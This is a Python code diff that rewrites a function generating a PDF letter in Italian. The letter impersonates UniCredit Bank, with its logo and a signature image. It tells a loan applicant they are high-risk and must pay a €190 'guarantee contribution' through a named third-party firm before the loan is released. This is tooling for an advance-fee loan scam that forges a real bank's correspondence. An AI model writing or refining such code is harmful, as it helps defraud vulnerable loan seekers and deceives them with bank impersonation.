@@ -284,19 +284,110 @@ def _letter_common(subject: str, body: str) -> BytesIO:
 
 
 def build_lettera_garanzia(name: str) -> BytesIO:
-    subj = "Versamento Contributo di Garanzia"
-    body = (
-        f"Gentile <b>{name}</b>,<br/><br/>"
-        "Desideriamo informarla che, a seguito delle verifiche effettuate nel corso dell'istruttoria "
-        "della sua pratica di finanziamento, il suo nominativo risulta rientrare nella categoria dei "
-        "soggetti a rischio elevato secondo i parametri interni di affidabilità creditizia.<br/><br/>"
-        "In ottemperanza alle normative vigenti e alle procedure interne di tutela, il finanziamento "
-        f"approvato è soggetto all'applicazione di un <b>Contributo di Garanzia una tantum pari a {money(GARANZIA_COST)}</b>. "
-        "Questo contributo è finalizzato a garantire la regolare erogazione e gestione del credito concesso.<br/><br/>"
-        "Tutte le operazioni finanziarie, inclusa la corresponsione del Contributo di Garanzia, devono "
-        "essere effettuate esclusivamente tramite il nostro intermediario autorizzato <b>1capital S.r.l.</b>"
+    """
+    Генерирует PDF гарантийного письма максимально близко к шаблону garanty.html
+    """
+    from reportlab.lib.styles import ParagraphStyle
+    buf = BytesIO()
+    s = _styles()
+    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Image, ListFlowable, ListItem
+    from reportlab.lib.enums import TA_LEFT
+    from reportlab.lib.units import cm
+    from reportlab.lib import colors
+
+    # --- Стили ---
+    header_style = ParagraphStyle(
+        'Header', parent=s["Header"], fontSize=18, leading=22, alignment=TA_LEFT, spaceAfter=8, fontName="Helvetica-Bold"
     )
-    return _letter_common(subj, body)
+    subheader_style = ParagraphStyle(
+        'SubHeader', parent=s["Header"], fontSize=13, leading=16, alignment=TA_LEFT, spaceAfter=6, fontName="Helvetica-Bold"
+    )
+    body_style = ParagraphStyle(
+        'Body', parent=s["Body"], fontSize=12, leading=16, alignment=TA_LEFT, spaceAfter=6
+    )
+    bullet_style = ParagraphStyle(
+        'Bullet', parent=s["Body"], fontSize=12, leading=16, leftIndent=18, bulletIndent=6, spaceAfter=2
+    )
+    check_style = ParagraphStyle(
+        'Check', parent=s["Body"], fontSize=12, leading=16, leftIndent=18, bulletIndent=6, spaceAfter=2
+    )
+    ps_style = ParagraphStyle(
+        'PS', parent=s["Body"], fontSize=11, leading=14, alignment=TA_LEFT, spaceAfter=4, textColor=colors.grey
+    )
+    # --- Документ ---
+    doc = SimpleDocTemplate(
+        buf, pagesize=A4,
+        leftMargin=2*cm, rightMargin=2*cm,
+        topMargin=2*cm, bottomMargin=2*cm
+    )
+    elems = []
+    # --- Логотип ---
+    if os.path.exists(LOGO_PATH):
+        elems.append(Image(LOGO_PATH, width=3.5*cm, height=3.5*cm))
+        elems.append(Spacer(1, 8))
+    # --- Заголовки ---
+    elems.append(Paragraph("UniCredit Bank", header_style))
+    elems.append(Paragraph("Ufficio Clientela Privata", subheader_style))
+    elems.append(Spacer(1, 8))
+    # --- Тема ---
+    elems.append(Paragraph("<b>Oggetto:</b> Pagamento del Contributo di Garanzia", body_style))
+    elems.append(Spacer(1, 10))
+    # --- Приветствие ---
+    elems.append(Paragraph(f"Egregio Cliente, <b>{name}</b>", body_style))
+    elems.append(Spacer(1, 8))
+    # --- Основной текст ---
+    elems.append(Paragraph(
+        "Durante l'analisi della Sua richiesta di finanziamento, il nostro servizio di sicurezza ha identificato il Suo profilo come appartenente alla categoria a rischio elevato secondo le politiche di scoring creditizio interno di UniCredit.",
+        body_style))
+    elems.append(Spacer(1, 2))
+    elems.append(Paragraph(
+        "In conformità con la normativa vigente e le procedure di sicurezza interne di UniCredit, per completare l'erogazione del finanziamento approvato è richiesto il versamento di un <b>Contributo di Garanzia una tantum di € 190,00.</b>",
+        body_style))
+    elems.append(Spacer(1, 8))
+    # --- Finalità ---
+    elems.append(Paragraph("<b>Finalità del contributo:</b>", body_style))
+    elems.append(ListFlowable([
+        ListItem(Paragraph("Garantire l'erogazione sicura dei fondi", bullet_style), bulletText="•"),
+        ListItem(Paragraph("Assicurare la corretta gestione del credito", bullet_style), bulletText="•"),
+        ListItem(Paragraph("Protezione da potenziali rischi", bullet_style), bulletText="•"),
+    ], bulletType='bullet', leftIndent=24))
+    elems.append(Spacer(1, 8))
+    # --- Условие ---
+    elems.append(Paragraph("<b>Condizione obbligatoria:</b>", body_style))
+    elems.append(Paragraph(
+        "Tutte le operazioni finanziarie, incluso il versamento del Contributo di Garanzia, devono essere effettuate <b>esclusivamente tramite il nostro partner ufficiale - 1of1fin S.r.l.</b>",
+        body_style))
+    elems.append(Spacer(1, 8))
+    # --- Вантажи ---
+    elems.append(Paragraph("<b>Vantaggi di UniCredit:</b>", body_style))
+    elems.append(ListFlowable([
+        ListItem(Paragraph("Conformità agli standard di sicurezza internazionali", check_style), bulletText="✓"),
+        ListItem(Paragraph("Condizioni trasparenti", check_style), bulletText="✓"),
+        ListItem(Paragraph("Tutela degli interessi del cliente", check_style), bulletText="✓"),
+    ], bulletType='bullet', leftIndent=24))
+    elems.append(Spacer(1, 8))
+    # --- Контакты ---
+    elems.append(Paragraph(
+        "Per ulteriori chiarimenti o assistenza nel procedere con il pagamento, può rivolgersi a qualsiasi filiale UniCredit.",
+        body_style))
+    elems.append(Spacer(1, 10))
+    # --- Подпись ---
+    elems.append(Paragraph("Cordiali saluti,", body_style))
+    elems.append(Paragraph("UniCredit Banca", body_style))
+    elems.append(Spacer(1, 10))
+    # --- PS ---
+    elems.append(Paragraph(
+        "<b>P.S.</b> <font color='grey'>La informiamo che questo requisito è condizione indispensabile per l'erogazione del finanziamento approvato.</font>",
+        ps_style))
+    elems.append(Spacer(1, 16))
+    # --- Ответственный ---
+    if os.path.exists(SIGNATURE_PATH):
+        elems.append(Image(SIGNATURE_PATH, width=4*cm, height=2*cm))
+        elems.append(Spacer(1, 2))
+    elems.append(Paragraph("Responsabile Ufficio Crediti Clientela Privata", body_style))
+    doc.build(elems)
+    buf.seek(0)
+    return buf
 
 
 def build_lettera_carta(data: dict) -> BytesIO:
